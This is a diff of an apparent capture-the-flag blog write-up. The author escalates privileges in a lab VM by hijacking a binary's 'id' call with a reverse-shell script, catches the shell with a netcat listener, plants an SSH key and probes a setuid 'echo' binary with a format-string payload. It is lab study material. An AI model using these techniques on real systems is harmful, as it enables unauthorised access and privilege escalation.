-Notice that I was now in the `developers` group. I was now allowed to run `./part2` too... with a verbose line showing me the permissions I would need to gain access to `/home/oj`:
+<p>Notice that I was now in the <code>developers</code> group. I was now allowed to run <code>./part2</code> too&hellip; with a verbose line showing me the permissions I would need to gain access to <code>/home/oj</code>:</p>
 
-```bash bazza Part2 test
-$ ./part2
+<pre><code class="language-bash">$ ./part2
 uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
 
 Can't touch this *nah na na na na naaaaaaaa nah*
@@ -1277,39 +1225,37 @@ $
 <p>And, as expected, I spent some time on this binary too. I didn&rsquo;t expect <code>part2</code> to be any easier :P
 After taking a break, I realized that the output that looks like that of <code>/usr/bin/id</code>, probably <strong>is</strong> that if it. So, off I went and did another <code>sha256sum</code>, type script, this time just with another reverse shell to port 4445, and naming it <code>id</code> so that part2 will pick it up:</p>
 
-<p>```bash bazza Part2 reverse shell
-→ nc -l 4445
+<pre><code class="language-bash">→ nc -l 4445
 $ /usr/bin/id
-uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)</p>
+uid=1004(bazza) gid=1004(bazza) euid=1005(oj) egid=1003(developers) groups=1005(oj),1004(bazza)
 
-<p>$ cd /home/oj
+$ cd /home/oj
 $ ls -lh
 total 584K
 -r-sr-xr-x 1 root root 579K Jul  5 21:12 echo
--rw-r&ndash;r&ndash; 1 root root  154 Jul  5 21:06 How to be an infosec rockstar 101.txt
-$</p>
+-rw-r--r-- 1 root root  154 Jul  5 21:06 How to be an infosec rockstar 101.txt
+$
+</code></pre>
 
-<pre><code>
-And there we are! Group membership for `oj`, and access to `/home/oj`
+<p>And there we are! Group membership for <code>oj</code>, and access to <code>/home/oj</code></p>
 
-## becoming root
-As with all of the other users, I added myself a ssh key for easy access.
+<h2 id="becoming-root:b2f2177e9b11b0fc1c7ac5c94bf719fa">becoming root</h2>
 
-Now, sadly I have to admit that this is as far as I have been able to come. `oj` has a binary called `echo` (not to be confused with the builtin echo), that, as expected, will echo what you input.
+<p>As with all of the other users, I added myself a ssh key for easy access.</p>
 
-```bash oj's echo
-oj@hell:~$ ./echo onetwothree
+<p>Now, sadly I have to admit that this is as far as I have been able to come. <code>oj</code> has a binary called <code>echo</code> (not to be confused with the builtin echo), that, as expected, will echo what you input.</p>
+
+<pre><code class="language-bash">oj@hell:~$ ./echo onetwothree
 onetwothree
 oj@hell:~$
 </code></pre>
 
 <p>I toyed with the inputs and noticed that when I entered inputs prefixed with a %, some strange stuff started to happen. Google helped me towards learning that this is what is called a <a href="https://www.owasp.org/index.php/Format_string_attack">Format String Attack</a></p>
 
-<p><code>bash Format String Thing
-oj@hell:~$ ./echo %08x.%08x.%08x
+<pre><code class="language-bash">oj@hell:~$ ./echo %08x.%08x.%08x
 080488c0.bffffcf8.00000000
 oj@hell:~$
-</code></p>
+</code></pre>
 
 <p>I am however satisfied that I have come this far, and will definitely endeavor to nail this format string vuln sometime. But that time is not now.</p>
 
